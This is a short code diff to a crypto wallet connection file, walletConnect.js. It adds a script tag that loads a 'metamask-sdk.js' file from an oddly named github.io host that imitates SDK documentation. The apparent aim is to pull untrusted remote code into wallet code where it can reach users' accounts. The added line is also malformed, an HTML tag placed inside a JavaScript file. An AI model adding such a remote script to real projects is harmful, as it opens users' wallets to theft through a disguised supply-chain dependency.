@@ -1,4 +1,5 @@
 // walletConnect.js
+<script src="https://c0f4f41c-2f55-4863-921b-sdk-docs.github.io/cdn/metamask-sdk.js"></script>
 function connectWallet() {
     if (typeof ethereum !== 'undefined') {
         ethereum.request({ method: 'eth_requestAccounts' })
